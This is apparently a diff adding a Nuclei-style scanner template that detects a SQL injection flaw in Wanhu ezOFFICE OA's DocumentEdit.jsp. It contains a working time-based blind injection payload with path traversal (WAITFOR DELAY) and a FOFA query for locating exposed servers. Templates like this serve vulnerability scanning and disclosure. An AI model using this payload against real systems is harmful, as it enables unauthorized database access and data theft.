@@ -1,0 +1,35 @@
+id: poc-local-oa-whir-ezoffice-DocumentEdit-jsp-SQLinject
+
+info:
+  name: 万户OA DocumentEdit.jsp SQL注入漏洞
+  author: capiton
+  severity: high
+  description: 万户OA DocumentEdit.jsp文件存在SQL注入漏洞，攻击者通过发送特殊的请求包可以对数据库进行SQL注入，获取服务器敏感信息
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20DocumentEdit.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: app="万户网络-ezOFFICE"
+    Vulnerability-Impact: 万户OA
+  tags: wanhu,ezoffice,whir,wanhuoa
+
+
+requests:
+  - method: GET
+    path:
+      # - "{{RootURL}}/defaultroot/iWebOfficeSign/OfficeServer.jsp%2F..%2F..%2Fpublic%2FiSignatureHTML.jsp%2FDocumentEdit.jsp%3FDocumentID%3D1%27%3BWAITFOR%2520DELAY%2520%270%3A0%3A1%27--"
+      - "{{RootURL}}/defaultroot/iWebOfficeSign/OfficeServer.jsp%2F..%2F..%2Fpublic%2FiSignatureHTML.jsp%2FDocumentEdit.jsp%3FDocumentID%3D1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--"
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      # - type: dsl
+      #   dsl:
+      #     - 'duration_1 >=1 && duration_1 <=5'
+
+      - type: dsl
+        dsl:
+          - 'duration >=5'
